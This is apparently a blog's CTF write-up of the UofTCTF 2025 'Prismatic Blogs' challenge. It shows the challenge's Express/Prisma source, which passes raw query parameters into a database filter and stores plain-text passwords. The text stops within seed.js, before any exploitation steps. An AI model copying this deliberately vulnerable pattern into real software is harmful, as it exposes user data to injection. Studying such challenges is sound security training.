<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="UofTCTF - Prismatic Blogs" />
<meta name="author" content="Anas" />
<meta property="og:locale" content="en" />
<meta name="description" content="Enumeration Reading source code Interesting points Identifying vulnerabilities" />
<meta property="og:description" content="Enumeration Reading source code Interesting points Identifying vulnerabilities" />
<link rel="canonical" href="https://github.com/NullBrunk/posts/uoftctf2025-prismatic/" />
<meta property="og:url" content="https://github.com/NullBrunk/posts/uoftctf2025-prismatic/" />
<meta property="og:site_name" content="NullBrunk" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-11T16:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="UofTCTF - Prismatic Blogs" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-08-24T12:04:57+00:00","datePublished":"2025-01-11T16:00:00+00:00","description":"Enumeration Reading source code Interesting points Identifying vulnerabilities","headline":"UofTCTF - Prismatic Blogs","mainEntityOfPage":{"@type":"WebPage","@id":"https://github.com/NullBrunk/posts/uoftctf2025-prismatic/"},"url":"https://github.com/NullBrunk/posts/uoftctf2025-prismatic/"}</script>
<!-- End Jekyll SEO tag -->


  <title>UofTCTF - Prismatic Blogs | NullBrunk
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="NullBrunk">
<meta name="application-name" content="NullBrunk">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/favicons/logo.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">NullBrunk</a>
    <p class="site-subtitle fst-italic mb-0">Web pentester, CTF player.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
          
          <li class="nav-item">
            <a href="/ctfs/" class="nav-link">
              <i class="fa-fw fas fa-flag"></i>
              

              <span>CTFS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tools/" class="nav-link">
              <i class="fa-fw fas fas fa-code"></i>
              

              <span>TOOLS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              

              <span>TAGS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/resume/" class="nav-link">
              <i class="fa-fw fas fa-file"></i>
              

              <span>RESUME</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              

              <span>ABOUT</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
        
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap justify-content-center align-items-center w-100">
    <a href="https://ctftime.org/user/157452" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fa-regular fa-font-awesome"></i>
    </a>

    <a href="https://www.root-me.org/NullBrunk" aria-label="rootme" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-skull"></i>
    </a>

    <a href="https://github.com/nullbrunk" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fab fa-github"></i>
    </a>

    <a href="https://tryhackme.com/p/nullbrunk" aria-label="tryhackme" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-cloud"></i>
    </a>

    <a href="mailto:anas.idiri.pro@gmail.com" aria-label="mail" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-envelope"></i>
    </a>
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!--  include topbar.html lang=lang -->

        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11   col-xl-9  px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->










<header id="topbar-wrapper" aria-label="Top Bar">
    <div id="topbar" class="d-flex align-items-center justify-content-between h-100" >
        <nav id="breadcrumb" aria-label="Breadcrumb">
            <span><a href="/">Home</a></span>
             

            
                <span>
                 <a href="/categories/writeups/">Writeups</a>
                </span>
            
                <span>
                 <a href="/categories/ctftime2025/">CTFTime2025</a>
                </span>
            
                <span>
                 <a href="/categories/uoftctf2025/">UofTCTF2025</a>
                </span>
            

             
             
            

            
             
            
            <span>UofTCTF - Prismatic Blogs</span>
        </nav>
    </div>
</header>

<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>UofTCTF - Prismatic Blogs</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1736611200"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jan 11, 2025
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1756037097"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 24, 2025
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/NullBrunk/">Anas</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2676 words"
>
  <em>14 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">UofTCTF - Prismatic Blogs</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">UofTCTF - Prismatic Blogs</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <ol>
  <li>Enumeration
    <ul>
      <li><a href="#reading-source-code">Reading source code</a></li>
      <li><a href="#interesting-points">Interesting points</a></li>
      <li><a href="#identifying-vulnerabilities">Identifying vulnerabilities</a></li>
    </ul>
  </li>
  <li>Exploitation
    <ul>
      <li><a href="#exploiting-the-vulnerability">Exploiting the vulnerability</a></li>
      <li><a href="#scripting-case-unsensitive">Scripting (case unsensitive)</a></li>
      <li><a href="#scripting-case-sensitive">Scripting (case sensitive)</a></li>
      <li><a href="#getting-the-flag">Getting the flag</a></li>
    </ul>
  </li>
</ol>

<hr />

<h1 id="enumeration">Enumeration</h1>

<h3 id="reading-source-code"><span class="me-2">Reading source code</span><a href="#reading-source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Here is the application source code:</p>

<details id="indexjs">
  <summary>index.js</summary>

  <div file="index.js" class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="index.js"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="rouge-code"><pre><span class="k">import</span> <span class="nx">express</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">express</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span> <span class="nx">PrismaClient</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">@prisma/client</span><span class="dl">"</span><span class="p">;</span>

<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span>

<span class="kd">const</span> <span class="nx">prisma</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PrismaClient</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span>
  <span class="dl">"</span><span class="s2">/api/posts</span><span class="dl">"</span><span class="p">,</span>
  <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
      <span class="kd">let</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>
      <span class="nx">query</span><span class="p">.</span><span class="nx">published</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
      <span class="kd">let</span> <span class="nx">posts</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">prisma</span><span class="p">.</span><span class="nx">post</span><span class="p">.</span><span class="nf">findMany</span><span class="p">({</span><span class="na">where</span><span class="p">:</span> <span class="nx">query</span><span class="p">});</span>
      <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">posts</span><span class="p">})</span>
    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span> <span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">error</span> <span class="p">});</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
    <span class="dl">"</span><span class="s2">/api/login</span><span class="dl">"</span><span class="p">,</span>
    <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="kd">let</span> <span class="p">{</span><span class="nx">name</span><span class="p">,</span> <span class="nx">password</span><span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
            <span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">prisma</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nf">findUnique</span><span class="p">({</span><span class="na">where</span><span class="p">:{</span>
                    <span class="na">name</span><span class="p">:</span> <span class="nx">name</span>
                <span class="p">},</span>
                <span class="na">include</span><span class="p">:{</span>
                    <span class="na">posts</span><span class="p">:</span> <span class="kc">true</span>
                <span class="p">}</span>
            <span class="p">});</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">password</span> <span class="o">===</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span> 
                <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">posts</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">posts</span><span class="p">});</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">});</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">error</span><span class="p">});</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">)</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`Server is running on http://localhost:</span><span class="p">${</span><span class="nx">PORT</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<details id="seedjs">
  <summary>seed.js</summary>

  <div file="seed.js" class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="seed.js"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
</pre></td><td class="rouge-code"><pre><span class="k">import</span> <span class="p">{</span> <span class="nx">PrismaClient</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">@prisma/client</span><span class="dl">"</span><span class="p">;</span>

<span class="kd">const</span> <span class="nx">prisma</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PrismaClient</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">FLAG</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">uoftctf{FAKEFLAGFAKEFLAG}</span><span class="dl">"</span>

<span class="kd">function</span> <span class="nf">generateString</span><span class="p">(</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">characters</span> <span class="o">=</span><span class="dl">'</span><span class="s1">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</span><span class="dl">'</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">charactersLength</span> <span class="o">=</span> <span class="nx">characters</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
    <span class="k">for </span><span class="p">(</span> <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
        <span class="nx">result</span> <span class="o">+=</span> <span class="nx">characters</span><span class="p">.</span><span class="nf">charAt</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">charactersLength</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">const</span> <span class="nx">USERS</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">White</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">password</span><span class="p">:</span> <span class="nf">generateString</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span><span class="o">+</span><span class="mi">15</span><span class="p">),</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Bob</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">password</span><span class="p">:</span> <span class="nf">generateString</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span><span class="o">+</span><span class="mi">15</span><span class="p">),</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Tommy</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">password</span><span class="p">:</span> <span class="nf">generateString</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span><span class="o">+</span><span class="mi">15</span><span class="p">),</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Sam</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">password</span><span class="p">:</span> <span class="nf">generateString</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span><span class="o">+</span><span class="mi">15</span><span class="p">),</span>
    <span class="p">},</span>
<span class="p">];</span>

<span class="kd">const</span> <span class="nx">NUM_USERS</span> <span class="o">=</span> <span class="nx">USERS</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> 

<span class="c1">// all chatGPT generated cause im lazy</span>
<span class="kd">const</span> <span class="nx">POSTS</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span>
    <span class="na">title</span><span class="p">:</span> <span class="s2">`Why Cybersecurity is Everyone's Responsibility`</span><span class="p">,</span>
    <span class="na">body</span><span class="p">:</span> <span class="s2">`In today's digital age, cybersecurity isn't just an IT concern—it's everyone's responsibility. From clicking suspicious links to using weak passwords, small mistakes can lead to big vulnerabilities. Simple habits like enabling two-factor authentication, updating software, and being mindful of phishing emails can protect not just yourself but your entire organization. Cybersecurity starts with awareness—how are you contributing to a safer digital world?`</span><span class="p">,</span>
    <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
    <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`Boosting Productivity with Time Blocking`</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`Struggling to get things done? Time blocking might be your answer. By dividing your day into focused chunks of work, you can minimize distractions and maximize efficiency. Start by identifying your most important tasks, assign specific time slots, and stick to them. Bonus tip: leave buffer time for unexpected interruptions. Time blocking isn’t just about scheduling—it’s about creating space for what truly matters.`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`3 Easy Tips to Save Energy at Home`</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`Reducing your energy footprint doesn’t have to be complicated. Start small:

Switch to LED bulbs—they last longer and use less power.
Unplug electronics when not in use—they still draw power even when off.
Use a programmable thermostat to optimize heating and cooling.
These simple changes save money and help the planet—win-win!`</span><span class="p">,</span>
        <span class="na">authorId</span><span class="p">:</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span><span class="o">*</span><span class="nx">NUM_USERS</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
        <span class="na">published</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="na">title</span><span class="p">:</span> <span class="s2">`How to Start Your Fitness Journey Today`</span><span class="p">,</span>
